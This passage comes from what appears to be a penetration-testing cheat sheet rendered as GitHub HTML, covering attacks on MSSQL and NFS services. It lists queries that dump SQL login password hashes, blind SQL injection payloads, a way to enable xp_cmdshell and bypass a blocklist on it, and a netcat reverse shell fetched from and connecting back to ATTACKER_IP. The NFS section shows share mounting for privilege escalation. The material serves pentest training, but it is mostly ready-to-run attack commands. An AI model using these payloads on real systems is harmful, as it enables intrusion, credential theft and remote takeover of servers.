dir=\"auto\" data-snippet-clipboard-copy-content=\"# simplest tool for interactive MSSQL session\nimpacket-mssqlclient USERNAME:PASSWORD@VICTIM_IP -windows-auth\n# requires double quotes for xp_cmdshell strings\n\n# alternative option, can use single quotes for xp_cmdshell strings\nsqsh -S $VICTIM_IP -U 'DOMAIN\\USERNAME' -P PASSWORD [-D DATABASE]\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e simplest tool for interactive MSSQL session\u003c/span\u003e\nimpacket-mssqlclient USERNAME:PASSWORD@VICTIM_IP -windows-auth\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e requires double quotes for xp_cmdshell strings\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternative option, can use single quotes for xp_cmdshell strings\u003c/span\u003e\nsqsh -S \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -U \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eDOMAIN\\USERNAME\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -P PASSWORD [-D DATABASE]\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFrom Windows:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-batchfile notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sqlcmd -S SERVER -l 30\nsqlcmd -S SERVER -U USERNAME -P PASSWORD -l 30\"\u003e\u003cpre\u003esqlcmd -S SERVER -l \u003cspan class=\"pl-c1\"\u003e30\u003c/span\u003e\nsqlcmd -S SERVER -U USERNAME -P PASSWORD -l \u003cspan class=\"pl-c1\"\u003e30\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eUseful commands:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"-- show username\nselect user_name();\nselect current_user;  -- alternate way\n\n-- show server version\nselect @@version;\n\n-- get server name\nselect @@servername;\n\n-- show list of databases (\u0026quot;master.\u0026quot; is optional)\nselect name from master.sys.databases;\nexec sp_databases;  -- alternate way\n-- note: built-in databases are master, tempdb, model, and msdb\n-- you can exclude them to show only user-created databases like so:\nselect name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');\n\n-- use database\nuse master\n\n-- getting table names from a specific database:\nselect table_name from somedatabase.information_schema.tables;\n\n-- getting column names from a specific table:\nselect column_name from somedatabase.information_schema.columns where table_name='sometable';\n\n-- get credentials for 'sa' login user:\nselect name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;\n\n-- get credentials from offsec database (using 'dbo' table schema) user table\nselect * from offsec.dbo.users;\n\n-- error/boolean-based blind injection\n' AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #\n\n-- time-based blind injection\n' WAITFOR DELAY '0:0:3'; -- #\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show username\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e user_name();\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ecurrent_user\u003c/span\u003e;  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e alternate way\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show server version\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e @@version;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e get server name\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e @@servername;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e show list of databases (\"master.\" is optional)\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e name \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emaster\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esys\u003c/span\u003e.databases;\nexec sp_databases;  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e alternate way\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e note: built-in databases are master, tempdb, model, and msdb\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e you can exclude them to show only user-created databases like so:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e name \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emaster\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esys\u003c/span\u003e.databases \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e name not \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003emaster\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003etempdb\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003emodel\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003emsdb\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e);\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e use database\u003c/span\u003e\nuse master\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e getting table names from a specific database:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e table_name \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esomedatabase\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einformation_schema\u003c/span\u003e.tables;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e getting column names from a specific table:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e column_name \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esomedatabase\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einformation_schema\u003c/span\u003e.columns \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e table_name\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003esometable\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e get credentials for 'sa' login user:\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e name,\u003cspan class=\"pl-c1\"\u003emaster\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esys\u003c/span\u003e.fn_varbintohexstr(password_hash) \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003emaster\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esys\u003c/span\u003e.sql_logins;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e get credentials from offsec database (using 'dbo' table schema) user table\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eoffsec\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edbo\u003c/span\u003e.users;\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e error/boolean-based blind injection\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e-- time-based blind injection\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e WAITFOR DELAY \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e0:0:3\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e; \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e #\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eReferences:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet\" rel=\"nofollow\"\u003ePentestMonkey MSSQL Injection Cheat Sheet\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md\"\u003ePayloadsAllTheThings - MSSQL Injection\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server\" rel=\"nofollow\"\u003eHackTricks - Pentesting MSSQL\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.15.3 MSSQL Command Execution\u003c/h3\u003e\u003ca id=\"user-content-2153-mssql-command-execution\" class=\"anchor\" aria-label=\"Permalink: 2.15.3 MSSQL Command Execution\" href=\"#2153-mssql-command-execution\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSimple command execution:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Username + Password + CMD command\ncrackmapexec mssql -d DOMAIN -u USERNAME -p PASSWORD -x \u0026quot;whoami\u0026quot; $VICTIM_IP\n# Username + Hash + PS command\ncrackmapexec mssql -d DOMAIN -u USERNAME -H HASH -X '$PSVersionTable' $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Username + Password + CMD command\u003c/span\u003e\ncrackmapexec mssql -d DOMAIN -u USERNAME -p PASSWORD -x \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Username + Hash + PS command\u003c/span\u003e\ncrackmapexec mssql -d DOMAIN -u USERNAME -H HASH -X \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e$PSVersionTable\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsing interactive session:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"-- Check if you have server admin rights to enable command execution:\n-- Returns 1 if admin\nselect is_srvrolemember('sysadmin');\ngo\n\n-- Check if already enabled\n-- check if xp_cmdshell is enabled\nselect convert(int, isnull(value, value_in_use)) as cmdshell_enabled from sys.configurations where name = n'xp_cmdshell';\ngo\n\n-- turn on advanced options; needed to configure xp_cmdshell\nexec sp_configure 'show advanced options', 1;reconfigure;\ngo\n\n-- enable xp_cmdshell\nexec sp_configure 'xp_cmdshell', 1;RECONFIGURE;\ngo\n\n-- Quickly check what the service account is via xp_cmdshell\nEXEC xp_cmdshell 'whoami';\ngo\n-- can be shortened to just: xp_cmdshell 'whoami.exe';\n-- long form: EXEC master..xp_cmdshell 'dir *.exe'\n\n-- Bypass blackisted \u0026quot;EXEC xp_cmdshell\u0026quot;\nDECLARE @x AS VARCHAR(50)='xp_cmdshell'; EXEC @x 'whoami' \n\n-- Get netcat reverse shell\nxp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\\users\\public\\nc.exe'\ngo\nxp_cmdshell 'c:\\users\\public\\nc.exe -e cmd ATTACKER_IP 443'\ngo\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Check if you have server admin rights to enable command execution:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Returns 1 if admin\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e is_srvrolemember(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003esysadmin\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e);\ngo\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Check if already enabled\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e check if xp_cmdshell is enabled\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eselect\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003econvert\u003c/span\u003e(\u003cspan class=\"pl-k\"\u003eint\u003c/span\u003e, isnull(value, value_in_use)) \u003cspan class=\"pl-k\"\u003eas\u003c/span\u003e cmdshell_enabled \u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esys\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003econfigurations\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ewhere\u003c/span\u003e name \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e n\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003exp_cmdshell\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\ngo\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e turn on advanced options; needed to configure xp_cmdshell\u003c/span\u003e\nexec sp_configure \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eshow advanced options\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e;reconfigure;\ngo\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e enable xp_cmdshell\u003c/span\u003e\nexec sp_configure \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003exp_cmdshell\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e;RECONFIGURE;\ngo\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Quickly check what the service account is via xp_cmdshell\u003c/span\u003e\nEXEC xp_cmdshell \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\ngo\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e can be shortened to just: xp_cmdshell 'whoami.exe';\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e long form: EXEC master..xp_cmdshell 'dir *.exe'\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Bypass blackisted \"EXEC xp_cmdshell\"\u003c/span\u003e\nDECLARE @x \u003cspan class=\"pl-k\"\u003eAS\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eVARCHAR\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e50\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003exp_cmdshell\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e; EXEC @x \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e Get netcat reverse shell\u003c/span\u003e\nxp_cmdshell \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003epowershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\u003cspan class=\"pl-cce\"\u003e\\u\u003c/span\u003esers\u003cspan class=\"pl-cce\"\u003e\\p\u003c/span\u003eublic\u003cspan class=\"pl-cce\"\u003e\\n\u003c/span\u003ec.exe\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\ngo\nxp_cmdshell \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ec:\u003cspan class=\"pl-cce\"\u003e\\u\u003c/span\u003esers\u003cspan class=\"pl-cce\"\u003e\\p\u003c/span\u003eublic\u003cspan class=\"pl-cce\"\u003e\\n\u003c/span\u003ec.exe -e cmd ATTACKER_IP 443\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\ngo\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.16 NFS - 2049\u003c/h2\u003e\u003ca id=\"user-content-216-nfs---2049\" class=\"anchor\" aria-label=\"Permalink: 2.16 NFS - 2049\" href=\"#216-nfs---2049\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://book.hacktricks.xyz/pentesting/nfs-service-pentesting\" rel=\"nofollow\"\u003eHackTricks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# scan with scripts\nnmap -n -v -p 2049 -sV --script=\u0026quot;safe and nfs-*\u0026quot; -oA nmap/nfs-scripts $VICTIM_IP\n\n# list all mountpoints\nshowmount -a $VICTIM_IP\n# list all directories\nshowmount -d $VICTIM_IP\n# list all exports (remote folders you can mount)\nshowmount -e $VICTIM_IP\n\n# the exports are also in /etc/exports\n# look for exports with no_root_squash/no_all_squash setting for privesc\n# https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe\n\n# Mounting an exported share:\n# mount -t nfs [-o vers=2] \u0026lt;ip\u0026gt;:\u0026lt;remote_folder\u0026gt; \u0026lt;local_folder\u0026gt; -o nolock\n# use version 2 because it doesn't have any authentication or authorization\n# if mount fails, try without vers=2\n# dir may need \u0026quot;/\u0026quot;prefix\n# dir is one of showmount -e results (from /etc/exports)\nmkdir nfs \u0026amp;\u0026amp; \\\nsudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs\n\n# create user with specific UID to be able to read files on your kali box\n# \u0026quot;-s\u0026quot; login shell, \u0026quot;-M\u0026quot; no create home\nsudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser\n# removing user when done:\nsudo deluser --remove-home tempuser \u0026amp;\u0026amp; sudo groupdel tempuser\n# or just switch to root to read nearly everything:\nsudo su\n# if needing a specific group:\nsudo groupadd -g 1010 tempgroup\nsudo usermod -a -G tempgroup tempuser\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e scan with scripts\u003c/span\u003e\nnmap -n -v -p 2049 -sV --script=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esafe and nfs-*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -oA nmap/nfs-scripts \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all mountpoints\u003c/span\u003e\nshowmount -a \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all directories\u003c/span\u003e\nshowmount -d \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all exports (remote folders you can mount)\u003c/span\u003e\nshowmount -e \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e the exports are also in /etc/exports\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for exports with no_root_squash/no_all_squash setting for privesc\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Mounting an exported share:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mount -t nfs [-o vers=2] \u0026lt;ip\u0026gt;:\u0026lt;remote_folder\u0026gt; \u0026lt;local_folder\u0026gt; -o nolock\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use version 2 because it doesn't have any authentication or authorization\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if mount fails, try without vers=2\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dir may need \"/\"prefix\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dir is one of showmount -e results (from /etc/exports)\u003c/span\u003e\nmkdir nfs \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \\\nsudo mount -t nfs -o rw,nolock,vers=2 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e:DIR nfs\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create user with specific UID to be able to read files on your kali box\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"-s\" login shell, \"-M\" no create home\u003c/span\u003e\nsudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e removing user when done:\u003c/span\u003e\nsudo deluser --remove-home tempuser \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e sudo groupdel tempuser\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or just switch to root to read nearly everything:\u003c/span\u003e\nsudo su\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if needing a specific group:\u003c/span\u003e\nsudo groupadd -g 1010 tempgroup\nsudo usermod -a -G tempgroup tempuser\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSee also: \u003ca href=\"#67-using-nfs-for-privilege-escalation\"\u003e6.7. Using NFS for Privilege Escalation\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.17 MySQL - 3306\u003c/h2\u003e\u003ca id=\"user-content-217-mysql---3306\" class=\"anchor\" aria-label=\"Permalink: 2.17 MySQL - 3306\" href=\"#217-mysql---3306\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMySQL listens on \u003ccode\u003eTCP 3306\u003c/code\u003e by default. You'll see it during a port scan or when running \u003ccode\u003enetstat -tnl\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eLogging in:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"## Locally:\n# as root without password (if allowed)\nmysql -u root\n# same, but prompt for password\nmysql -u root 